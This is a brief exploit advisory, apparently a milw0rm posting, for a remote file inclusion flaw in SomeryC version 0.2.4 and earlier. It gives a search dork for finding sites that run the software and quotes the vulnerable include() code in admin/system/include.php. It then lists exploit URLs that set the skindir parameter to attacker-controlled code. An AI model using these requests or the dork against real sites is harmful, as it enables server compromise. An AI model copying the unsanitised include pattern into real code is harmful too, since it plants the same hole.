@@ -1,0 +1,24 @@
+### SomeryC <= v0.2.4 Remote File Include ###
+
+#Vendor:        http://someryc.mostpopularcomic.com
+#download       http://someryc.mostpopularcomic.com/sC024.zip
+
+#found by: Katatafish (karatatata@hush.com)
+
+#d0rk: "powered by someryc"
+
+#vuln-code(/admin/system/include.php):
+
+if ($start) {
+....
+       include("$skindir/header.php");
+}
+....
+       include("$skindir/footer.php");
+
+#exploit:
+
+http://www.site.com/admin/system/include.php?skindir=[evilCode]
+http://www.site.com/admin/system/include.php?start=1&skindir=[evilCode]
+
+# milw0rm.com [2007-08-27]
